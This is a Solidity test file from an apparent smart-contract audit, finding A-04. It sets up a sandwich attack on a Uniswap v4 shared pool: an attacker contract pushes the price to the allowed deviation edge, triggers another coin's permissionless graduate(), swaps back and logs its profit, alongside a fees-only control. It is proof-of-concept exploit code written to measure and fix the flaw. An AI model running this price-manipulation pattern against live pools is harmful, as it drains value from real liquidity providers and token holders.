// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {AuditABase} from "./AuditABase.sol";
import {Swapper} from "../../utils/PoolBase.sol";
import {SweepVault} from "../../../src/SweepVault.sol";
import {FrogCurve} from "../../../src/curve/FrogCurve.sol";
import {CurveToken} from "../../../src/curve/CurveToken.sol";

/// A-04: `graduate()` is anyone's, and the shared-pool add is priced at the pool's spot within `maxDeviation` (1000 ticks ≈ 10%)
/// of the keeper's cap. So one transaction can push the shared price to the edge, graduate somebody else's coin, and swap back.
/// This measures what that earns (valued at the keeper's cap), both directions.
contract GraduationSandwichTest is AuditABase {
    using StateLibrary for IPoolManager;

    Swapper atk;

    function setUp() public override {
        super.setUp();
        atk = new Swapper(PM);
        vm.deal(address(atk), 100 ether);
        _wrappedFor(address(atk), 20);
        // a first coin graduates normally: the shared pool has the lock's layers
        (FrogCurve c1,) = _launch(SweepVault.Policy.RAFFLE, false);
        _skipBoth(20 minutes);
        _fillCurve(c1);
        c1.graduate();
    }

    function _value() internal view returns (uint256) {
        return address(atk).balance + Math.mulDiv(wrapper.balanceOf(address(atk)), CAP, 1e18);
    }

    function _run(bool pushWxCheap) internal returns (int256 pnl) {
        (FrogCurve c2,) = _launch(SweepVault.Policy.BURN, false);
        _skipBoth(20 minutes);
        _postCap(curveRaffle, CAP);
        _floor(CAP);
        _fillCurve(c2);

        PoolKey memory key = lock.sharedKey();
        (uint160 s0, int24 t0,,) = PM.getSlot0(key.toId());
        int24 refTick = TickMath.getTickAtSqrtPrice(uint160(Math.sqrt(Math.mulDiv(1e18, 2 ** 192, CAP))));
        uint256 v0 = _value();
        // tick up = wX cheaper (sell wX, oneForZero); tick down = wX dearer (sell ETH, zeroForOne)
        int24 edge = pushWxCheap ? refTick + 990 : refTick - 990;
        atk.swap(key, !pushWxCheap, pushWxCheap ? 20e18 : 50 ether, TickMath.getSqrtPriceAtTick(edge));
        c2.graduate();
        atk.swap(key, pushWxCheap, pushWxCheap ? 50 ether : 20e18, s0);
        (, int24 t1,,) = PM.getSlot0(key.toId());
        pnl = int256(_value()) - int256(v0);
        emit log_named_int("tick before", t0);
        emit log_named_int("tick after", t1);
        emit log_named_int("attacker P&L, wei at the cap", pnl);
    }

    function test_A04_sandwich_wXCheap() public { _run(true); }
    function test_A04_sandwich_wXDear() public { _run(false); }

    /// Control: the same round trip with no graduation in the middle (fees only).
    function test_A04_control_roundTripOnly() public {
        PoolKey memory key = lock.sharedKey();
        (uint160 s0,,,) = PM.getSlot0(key.toId());
        int24 refTick = TickMath.getTickAtSqrtPrice(uint160(Math.sqrt(Math.mulDiv(1e18, 2 ** 192, CAP))));
        uint256 v0 = _value();
        atk.swap(key, true, 50 ether, TickMath.getSqrtPriceAtTick(refTick - 990));
        atk.swap(key, false, 20e18, s0);
        emit log_named_int("round trip P&L, wei at the cap", int256(_value()) - int256(v0));
    }
}
